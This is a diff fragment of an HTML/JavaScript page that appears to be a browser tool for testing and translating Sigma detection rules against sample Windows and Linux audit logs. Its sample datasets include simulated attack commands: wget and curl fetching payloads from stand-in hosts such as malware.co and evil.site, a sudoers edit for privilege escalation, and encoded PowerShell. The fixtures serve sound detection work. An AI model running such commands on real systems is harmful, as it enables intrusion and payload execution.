+type=PROCTITLE msg=audit(1729689600.123:987): proctitle=6375726C202D66734C
+
+type=SYSCALL msg=audit(1729689605.500:988): arch=c000003e syscall=59 success=yes exit=0 comm="whoami" exe="/usr/bin/whoami" uid=1000 gid=1000 key="recon"
+
+type=SYSCALL msg=audit(1729689620.200:989): arch=c000003e syscall=59 success=yes exit=0 comm="id" exe="/usr/bin/id" uid=1000 gid=1000 key="recon"
+
+type=SYSCALL msg=audit(1729689700.800:990): arch=c000003e syscall=59 success=yes exit=0 comm="sudo" exe="/usr/bin/sudo" uid=1000 euid=0 key="priv_esc"
+type=EXECVE msg=audit(1729689700.800:990): argc=3 a0="sudo" a1="visudo" a2="/etc/sudoers.d/attacker"
+type=PATH msg=audit(1729689700.800:990): item=0 name="/etc/sudoers.d/attacker"
+
+type=SYSCALL msg=audit(1729689800.100:991): arch=c000003e syscall=59 success=yes exit=0 comm="wget" exe="/usr/bin/wget" uid=0 gid=0 euid=0 key="cmd_exec"
+type=EXECVE msg=audit(1729689800.100:991): argc=3 a0="wget" a1="http://malware.co/payload" a2="-qO-"
+`,
+  data4: `{"ID":"1729689600.123:987","SYSCALL":{"arch":"x86_64","syscall":"execve","success":"yes","exit":0,"exe":"/usr/bin/curl","comm":"curl","uid":1000,"gid":1000,"euid":1000,"tty":"pts0","key":"cmd_exec"},"EXECVE":{"argc":4,"ARGV":["curl","https://evil.site/x.sh","-fsSL","-o/tmp/x"]},"PATH":[{"item":0,"name":"/usr/bin/curl","inode":111,"mode":"0100755"}],"PARENT_INFO":{"exe":"/bin/bash","comm":"bash"}}
+{"ID":"1729689605.500:988","SYSCALL":{"arch":"x86_64","syscall":"execve","success":"yes","exit":0,"exe":"/usr/bin/whoami","comm":"whoami","uid":1000,"gid":1000,"key":"recon"},"EXECVE":{"argc":1,"ARGV":["whoami"]}}
+{"ID":"1729689620.200:989","SYSCALL":{"arch":"x86_64","syscall":"execve","success":"yes","exit":0,"exe":"/usr/bin/id","comm":"id","uid":1000,"gid":1000,"key":"recon"},"EXECVE":{"argc":1,"ARGV":["id"]}}
+{"ID":"1729689700.800:990","SYSCALL":{"arch":"x86_64","syscall":"execve","success":"yes","exit":0,"exe":"/usr/bin/sudo","comm":"sudo","uid":1000,"euid":0,"key":"priv_esc"},"EXECVE":{"argc":3,"ARGV":["sudo","visudo","/etc/sudoers.d/attacker"]},"PATH":[{"item":0,"name":"/etc/sudoers.d/attacker"}],"PARENT_INFO":{"exe":"/bin/bash"}}
+`,
+  data5: `[
+  { "EventID": 4688, "Computer": "WKS-07", "CommandLine": "powershell -enc ABCDEF", "NewProcessName": "C:\\\\Windows\\\\System32\\\\powershell.exe", "User": "alice" },
+  { "EventID": 4688, "Computer": "WKS-08", "CommandLine": "cmd.exe /c dir", "NewProcessName": "C:\\\\Windows\\\\System32\\\\cmd.exe", "User": "carol" }
+]
+`,
+  // brute force 4625 dataset for correlation
+  data6: `[
+  {"EventID":4625,"TargetUserName":"admin","IpAddress":"10.0.0.7","@timestamp":"2026-04-24T10:00:01Z"},
+  {"EventID":4625,"TargetUserName":"admin","IpAddress":"10.0.0.7","@timestamp":"2026-04-24T10:00:12Z"},
+  {"EventID":4625,"TargetUserName":"admin","IpAddress":"10.0.0.7","@timestamp":"2026-04-24T10:00:30Z"},
+  {"EventID":4625,"TargetUserName":"admin","IpAddress":"10.0.0.7","@timestamp":"2026-04-24T10:01:05Z"},
+  {"EventID":4625,"TargetUserName":"admin","IpAddress":"10.0.0.7","@timestamp":"2026-04-24T10:02:40Z"},
+  {"EventID":4625,"TargetUserName":"admin","IpAddress":"10.0.0.7","@timestamp":"2026-04-24T10:03:11Z"},
+  {"EventID":4625,"TargetUserName":"admin","IpAddress":"10.0.0.7","@timestamp":"2026-04-24T10:04:55Z"},
+  {"EventID":4625,"TargetUserName":"guest","IpAddress":"10.0.0.9","@timestamp":"2026-04-24T10:05:00Z"},
+  {"EventID":4625,"TargetUserName":"guest","IpAddress":"10.0.0.9","@timestamp":"2026-04-24T10:05:30Z"},
+  {"EventID":4624,"TargetUserName":"bob","IpAddress":"10.0.0.10","@timestamp":"2026-04-24T10:06:00Z"}
+]
+`
+};
+
+/* ═══════════════════════════════════════════════════════════
+   UI
+   ═══════════════════════════════════════════════════════════ */
+const $ = id => document.getElementById(id);
+const ruleEl = $('rule');
+const dataEl = $('data');
+const fmtSel = $('data-format');
+const fmtTag = $('format-tag');
+
+// example button wiring
+document.querySelectorAll('[data-rule]').forEach(b => {
+  b.onclick = () => { ruleEl.value = EX[b.dataset.rule]; updateMeta(); };
+});
+document.querySelectorAll('[data-data]').forEach(b => {
+  b.onclick = () => {
+    dataEl.value = EX[b.dataset.data];
+    const map = { data1:'xml', data2:'xml', data3:'auditd', data4:'laurel', data5:'json', data6:'json' };
+    fmtSel.value = map[b.dataset.data] || 'auto';
+    fmtTag.textContent = '/ ' + fmtSel.value;
+    updateMeta();
+  };
+});
+$('btn-clear-rule').onclick = () => { ruleEl.value = ''; updateMeta(); };
+$('btn-clear-data').onclick = () => { dataEl.value = ''; updateFileBadge(null); updateMeta(); };
+
+fmtSel.addEventListener('change', () => { fmtTag.textContent = '/ ' + fmtSel.value; updateMeta(); });
+
+$('btn-upload-rule').onclick = () => $('file-rule').click();
+$('file-rule').onchange = async e => {
+  const f = e.target.files[0]; if (!f) return;
+  ruleEl.value = await f.text(); updateMeta(); e.target.value = '';
+};
+$('btn-upload-data').onclick = () => $('file-data').click();
+$('file-data').onchange = async e => { await loadDataFiles([...e.target.files]); e.target.value = ''; };
+
+async function loadDataFiles(files) {
+  if (!files.length) return;
+  const parts = await Promise.all(files.map(f => f.text()));
+  dataEl.value = parts.join('\n');
+  const ext = (files[0].name.split('.').pop() || '').toLowerCase();
+  const m = { xml:'xml', evtx:'xml', json:'json', ndjson:'ndjson', jsonl:'ndjson', json5:'json5', log:'auditd', audit:'auditd' };
+  if (m[ext]) { fmtSel.value = m[ext]; fmtTag.textContent = '/ ' + m[ext]; }
+  else { fmtSel.value = 'auto'; fmtTag.textContent = '/ auto'; }
+  const totalKB = files.reduce((s,f) => s + f.size, 0) / 1024;
+  updateFileBadge(files.length === 1 ? files[0].name + ' (' + totalKB.toFixed(1) + ' kB)' : files.length + ' files (' + totalKB.toFixed(1) + ' kB)');
+  updateMeta();
+}
+
+function updateFileBadge(label) {
+  const el = $('foot-file');
+  el.innerHTML = label ? 'FILE: <b>' + escapeHtml(label) + '</b>' : 'NO FILE LOADED';
+}
+
+['dragenter','dragover'].forEach(ev => dataEl.addEventListener(ev, e => { e.preventDefault(); e.stopPropagation(); dataEl.classList.add('drop-hover'); }));
+['dragleave','drop'].forEach(ev => dataEl.addEventListener(ev, e => { e.preventDefault(); e.stopPropagation(); dataEl.classList.remove('drop-hover'); }));
+dataEl.addEventListener('drop', async e => { const files = [...e.dataTransfer.files]; if (files.length) await loadDataFiles(files); });
+['dragenter','dragover'].forEach(ev => ruleEl.addEventListener(ev, e => { e.preventDefault(); e.stopPropagation(); ruleEl.classList.add('drop-hover'); }));
+['dragleave','drop'].forEach(ev => ruleEl.addEventListener(ev, e => { e.preventDefault(); e.stopPropagation(); ruleEl.classList.remove('drop-hover'); }));
+ruleEl.addEventListener('drop', async e => { const f = e.dataTransfer.files[0]; if (!f) return; ruleEl.value = await f.text(); updateMeta(); });
+
+// tabs
+document.querySelectorAll('.tab').forEach(t => {
+  t.onclick = () => {
+    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+    document.querySelectorAll('.tab-panel').forEach(x => x.classList.remove('active'));
+    t.classList.add('active');
+    $('panel-' + t.dataset.tab).classList.add('active');
+    if (t.dataset.tab === 'translate') renderTranslate();
+  };
+});
+
+function updateMeta() {
+  let count = 0;
+  try { count = parseEvents(dataEl.value, fmtSel.value).length; } catch { count = '?'; }
+  $('meta-events').textContent = 'EVENTS: ' + count;
+
+  try {
+    const docs = jsyaml.loadAll(ruleEl.value).filter(d => d && typeof d === 'object');
+    const corr = docs.find(d => d.correlation);
+    const primary = corr || docs[docs.length - 1];
+    const title = primary && primary.title ? primary.title.slice(0, 36) : '—';
+    $('meta-rule').textContent = 'RULE: ' + title + (corr ? ' [CORR]' : '');
+  } catch { $('meta-rule').textContent = 'RULE: [parse err]'; }
+
+  // re-render translate if active
+  const activeTab = document.querySelector('.tab.active');
+  if (activeTab && activeTab.dataset.tab === 'translate') renderTranslate();
+}
+dataEl.addEventListener('input', updateMeta);
+ruleEl.addEventListener('input', updateMeta);
+
+// preload
+ruleEl.value = EX.rule1;
+dataEl.value = EX.data1;
+fmtSel.value = 'xml';
+fmtTag.textContent = '/ xml';
+updateMeta();
+
+// execute
+$('execute').onclick = () => {
+  const t0 = performance.now();
+  $('foot-stat').textContent = 'RUNNING…';
+  try {
+    const events = parseEvents(dataEl.value, fmtSel.value);
+    const res = runRule(ruleEl.value, events);
+    const fmt = fmtSel.value === 'auto' ? detectFormat(dataEl.value) : fmtSel.value;
+    renderAnalysis(res, events, performance.now() - t0, fmt);
+    $('foot-stat').textContent = 'DONE';
+    // switch to analysis tab if on translate
+    document.querySelector('.tab[data-tab="analysis"]').click();
+  } catch (err) {
+    renderError(err);
+    $('foot-stat').textContent = 'ERROR';
+  }
+};
+
+function renderError(err) {
+  $('results').innerHTML = '<div class="error-box"><strong>⚠ execution error</strong>' + escapeHtml(err.message || String(err)) + '</div>';
+  $('rt-time').textContent = 'failed';
+}
+
+function escapeHtml(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
+function renderAnalysis(res, events, elapsed, fmt) {
+  $('rt-time').textContent = elapsed.toFixed(1) + ' ms · ' + fmt;
+  if (res.kind === 'detection') renderDetection(res.rule, res.result, events, elapsed, fmt);
+  else if (res.kind === 'correlation') renderCorrelation(res.result, events, elapsed, fmt);
+}
+
+function renderDetection(rule, results, events, elapsed, fmt) {
+  const hits = results.filter(r => r.hit).length;
+  const misses = results.length - hits;
+  const cond = (rule.detection && rule.detection.condition) || '';
+  const title = rule.title || '(untitled)';
+  const level = rule.level || 'unknown';
+
+  let html = `
+    <div class="summary">
+      <div><div class="stat-label">Events</div><div class="stat-val">${results.length}</div></div>
+      <div><div class="stat-label">Hits</div><div class="stat-val amber">${hits}</div></div>
+      <div><div class="stat-label">Misses</div><div class="stat-val">${misses}</div></div>
+      <div><div class="stat-label">Elapsed</div><div class="stat-val">${elapsed.toFixed(1)}<span style="font-size:12px;color:var(--text-faint)">ms</span></div></div>
+    </div>
+    <div style="margin-bottom:16px;font-size:11px;color:var(--text-dim);letter-spacing:0.1em;">
+      <div style="margin-bottom:6px;">▸ <b style="color:var(--text)">${escapeHtml(title)}</b> <span style="color:var(--text-faint);">· level=${escapeHtml(level)} · fmt=${fmt}</span></div>
+      <div>▸ condition: <span class="cond">${escapeHtml(cond)}</span></div>
+    </div>
+  `;
+  for (const r of results) {
+    const matched = Object.entries(r.selResults).filter(([,v])=>v.ok).map(([k])=>k);
+    const label = describeEvent(r.event);
+    html += `
+      <div class="event-row ${r.hit?'hit':'miss'}">
+        <div class="event-head" onclick="this.parentElement.classList.toggle('open')">
+          <div class="event-title">
+            <span class="badge ${r.hit?'hit':'miss'}">${r.hit?'MATCH':'no match'}</span>
+            <span>Event #${r.idx + 1}</span>
+            <span class="ellip">${escapeHtml(label)}</span>
+          </div>
+          <div style="font-size:11.5px;color:var(--text-dim);font-weight:600;letter-spacing:0.05em;">${matched.length ? '<span style="color:var(--amber);">●</span> sel: ' + matched.join(', ') : '<span style="color:var(--text-faint);">—</span>'}</div>
+        </div>
+        <div class="event-body">${renderEventBody(r)}</div>
+      </div>`;
+  }
+  $('results').innerHTML = html;
+  const firstHit = document.querySelector('.event-row.hit');
+  if (firstHit) firstHit.classList.add('open');
+}
+
+function renderCorrelation(corrRes, events, elapsed, fmt) {
+  const groups = corrRes.groups;
+  const hits = groups.filter(g => g.hit).length;
+  const refRules = corrRes.perRule.map(pr => pr.rule.title || pr.rule.name || '?');
+  const baseHits = corrRes.perRule.reduce((a, pr) => a + pr.hits.length, 0);
+  const title = corrRes.rule.title || '(untitled)';
+  const c = corrRes.rule.correlation;
+
+  let html = `
+    <div class="summary">
+      <div><div class="stat-label">Groups</div><div class="stat-val">${groups.length}</div></div>
+      <div><div class="stat-label">Hits</div><div class="stat-val violet">${hits}</div></div>
+      <div><div class="stat-label">Base hits</div><div class="stat-val">${baseHits}</div></div>
+      <div><div class="stat-label">Elapsed</div><div class="stat-val">${elapsed.toFixed(1)}<span style="font-size:12px;color:var(--text-faint)">ms</span></div></div>
+    </div>
+    <div style="margin-bottom:16px;font-size:11px;color:var(--text-dim);letter-spacing:0.1em;">
+      <div style="margin-bottom:6px;">▸ <b style="color:var(--text)">${escapeHtml(title)}</b> <span class="corr-chip">${escapeHtml(c.type)}</span></div>
+      <div>▸ rules: ${refRules.map(escapeHtml).join(' → ')}</div>
+      <div>▸ group-by: ${(c['group-by']||[]).map(escapeHtml).join(', ')} · timespan: ${escapeHtml(String(c.timespan||'—'))} · condition: ${escapeHtml(JSON.stringify(c.condition||{}))}</div>
+    </div>
+  `;
+  if (!groups.length) {
+    html += '<div style="color:var(--text-faint);font-size:11px;">No matching base events — no groups formed.</div>';
+  }
+  groups.sort((a,b) => (b.hit?1:0)-(a.hit?1:0) || b.count - a.count).forEach(g => {
+    const groupKey = g.groupKey || '(∅)';
+    const details = g.valueSet ? ' · values: ' + g.valueSet.slice(0, 8).join(', ') + (g.valueSet.length > 8 ? '…' : '') : '';
+    html += `
+      <div class="group-row ${g.hit?'hit':'miss'}">
+        <div class="group-head" onclick="this.parentElement.classList.toggle('open')">
+          <div class="group-key">
+            <span class="badge ${g.hit?'corr':'miss'}">${g.hit?'TRIGGER':'below'}</span>
+            <span><b style="color:var(--text)">${escapeHtml(groupKey)}</b></span>
+          </div>
+          <div class="group-count ${g.hit?'ok':'no'}">${g.count}</div>
+        </div>
+        <div class="group-body">
+          <div class="sub">Group: ${(g.groupFields||[]).map(escapeHtml).join(', ') || '(ungrouped)'}${details}</div>
+          <div class="sub">Events (${g.eventIdxs.length}):</div>
+          <ul>${g.eventIdxs.map(i => '<li>#' + (i+1) + ' · ' + escapeHtml(describeEvent(events[i])) + '</li>').join('')}</ul>
+        </div>
+      </div>`;
+  });
+  $('results').innerHTML = html;
+  const firstHit = document.querySelector('.group-row.hit');
+  if (firstHit) firstHit.classList.add('open');
+}
+
+function describeEvent(e) {
+  if (!e) return '';
+  if (e.EventID) return 'EventID=' + e.EventID + (e.Computer ? ' @ ' + e.Computer : '') + (e.TargetUserName ? ' · ' + e.TargetUserName : '');
+  if (e.exe) return e.exe + (e.comm ? ' (' + e.comm + ')' : '');
+  if (e.type) return 'auditd ' + e.type + (e._serial ? ' #' + e._serial : '');
+  const k = Object.keys(e).find(x => !x.startsWith('_'));
+  return k ? (k + '=' + String(e[k]).slice(0, 80)) : '';
+}
+
+function renderEventBody(r) {
+  const matchedFields = {};
+  for (const [,sr] of Object.entries(r.selResults)) if (sr.ok) for (const m of sr.matches) matchedFields[m.field] = true;
+  const rows = [];
+  for (const k of Object.keys(r.event).filter(x => !x.startsWith('_')).sort()) {
+    const v = r.event[k];
+    if (v === undefined || v === null) continue;
+    const isMatch = k in matchedFields;
+    rows.push('<div class="k">' + escapeHtml(k) + '</div><div class="v ' + (isMatch?'match':'') + '">' + escapeHtml(v) + '</div>');
+  }
+  const selHtml = Object.entries(r.selResults).map(([k, v]) =>
+    '<div style="margin-top:4px;"><span style="color:' + (v.ok?'var(--amber)':'var(--text-faint)') + ';">' + (v.ok?'✓':'✗') + ' ' + escapeHtml(k) + '</span></div>'
+  ).join('');
+  return '<div class="kv">' + rows.join('') + '</div>' +
+    '<div style="margin-top:12px;padding-top:10px;border-top:1px dashed var(--border);font-size:10.5px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-faint);">Selections</div>' + selHtml;
+}
+
+/* ═════════ TRANSLATE TAB ═════════ */
+function renderTranslate() {
+  const out = $('translate-out');
+  let graph;
+  try { graph = parseRuleGraph(ruleEl.value); }
+  catch (err) {
+    out.innerHTML = '<div class="empty"><div class="msg">parse error</div><div class="hint" style="color:var(--red)">' + escapeHtml(err.message) + '</div></div>';
+    return;
+  }
+  const primary = graph.docs[graph.docs.length - 1];
+  const isCorr = !!primary.correlation;
+  const title = primary.title || '(untitled)';
+
+  let html = `
+    <div class="translate-head">
+      <div>▸ <b>${escapeHtml(title)}</b> ${isCorr ? '<span class="corr-chip">' + escapeHtml(primary.correlation.type||'corr') + '</span>' : ''}</div>
+      <div class="meta">
+        ${graph.detections.length} detection rule${graph.detections.length!==1?'s':''} · ${graph.correlations.length} correlation${graph.correlations.length!==1?'s':''}
+      </div>
+    </div>
+  `;
+
+  for (const b of BACKENDS) {
+    let query, err;
+    try {
+      if (isCorr) query = b.corr(primary, graph);
+      else query = b.det(primary);
+    } catch (e) { err = e.message; }
+
+    html += `
+      <div class="backend-card">
+        <div class="backend-head">
+          <div class="backend-name"><span class="sigil">▸</span>${escapeHtml(b.name)}<span class="fmt">· ${escapeHtml(b.fmt)}</span></div>
+          <button class="backend-copy" data-backend="${b.id}">COPY</button>
+        </div>
+        <pre class="backend-query ${err?'error':''}" id="q-${b.id}">${escapeHtml(err || query || '(empty)')}</pre>
+        <div class="backend-notes"><b>NOTE</b> · ${escapeHtml(b.note)}</div>
+      </div>`;
+  }
+
+  out.innerHTML = html;
+  // wire copy buttons
+  document.querySelectorAll('.backend-copy').forEach(btn => {
+    btn.onclick = () => {
+      const id = btn.dataset.backend;
+      const q = document.getElementById('q-' + id).textContent;
+      navigator.clipboard.writeText(q).then(() => {
+        const orig = btn.textContent;
+        btn.textContent = '✓ COPIED';
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = orig; btn.classList.remove('copied'); }, 1200);
+      });
+    };
+  });
+}
+
+// keyboard
+document.addEventListener('keydown', e => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') { e.preventDefault(); $('execute').click(); }
+  if ((e.ctrlKey || e.metaKey) && e.key === 't') { e.preventDefault(); document.querySelector('.tab[data-tab="translate"]').click(); }
+});
+
+</script>
+</body>
+</html>
